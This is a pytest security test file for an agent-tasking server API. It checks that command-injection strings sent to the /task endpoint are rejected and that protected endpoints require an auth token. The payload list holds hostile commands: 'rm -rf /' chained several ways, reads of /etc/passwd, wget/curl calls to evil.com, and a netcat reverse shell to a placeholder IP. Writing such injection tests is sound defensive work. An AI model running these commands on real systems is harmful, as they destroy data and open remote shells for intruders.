import json
import pytest


class TestCommandInjection:
    """Security tests: verify all injection vectors are blocked."""

    INJECTION_PAYLOADS = [
        "whoami; rm -rf /",
        "whoami && rm -rf /",
        "whoami | rm -rf /",
        "whoami || rm -rf /",
        "`whoami`",
        "$(whoami)",
        "whoami > /tmp/pwned",
        "whoami < /etc/passwd",
        "whoami\nrm -rf /",
        "rm -rf /",
        "bash -c 'whoami'",
        "python -c 'import os; os.system(\"whoami\")'",
        "/bin/sh -c whoami",
        "wget http://evil.com",
        "curl http://evil.com",
        "nc -e /bin/sh 1.2.3.4 4444",
    ]

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_server_rejects_injection(self, client, auth_headers, fresh_store, payload):
        fresh_store.register(
            {"hostname": "h", "os": "L", "username": "u", "ip": "1.1.1.1"}, agent_id="sec-agent"
        )
        resp = client.post(
            "/task/sec-agent",
            headers=auth_headers,
            data=json.dumps({"command": payload}),
        )
        assert resp.status_code == 400, f"Injection payload {payload!r} was NOT rejected!"


class TestTokenSecurity:
    """Verify auth token enforcement on all protected endpoints."""

    PROTECTED_ENDPOINTS = [
        ("GET", "/agents"),
        ("POST", "/heartbeat"),
        ("GET", "/task/test"),
        ("POST", "/task/test"),
        ("POST", "/result/test"),
        ("GET", "/results/test"),
    ]

    @pytest.mark.parametrize("method,path", PROTECTED_ENDPOINTS)
    def test_no_token_rejected(self, client, method, path):
        resp = client.open(path, method=method)
        assert resp.status_code == 401, f"{method} {path} accepted without token"

    @pytest.mark.parametrize("method,path", PROTECTED_ENDPOINTS)
    def test_wrong_token_rejected(self, client, method, path):
        resp = client.open(
            path,
            method=method,
            headers={"X-Auth-Token": "wrong-token", "Content-Type": "application/json"},
        )
        assert resp.status_code == 401, f"{method} {path} accepted wrong token"


class TestHealthSecurity:
    def test_health_is_public(self, client):
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_health_returns_ok(self, client):
        resp = client.get("/health")
        assert resp.get_json()["status"] == "ok"


class TestNonceVisibility:
    def test_nonce_in_agents_response(self, client, auth_headers, fresh_store):
        resp = client.get("/agents", headers=auth_headers)
        body = resp.get_json()
        assert body["nonce"] == "sentrysec-2026"
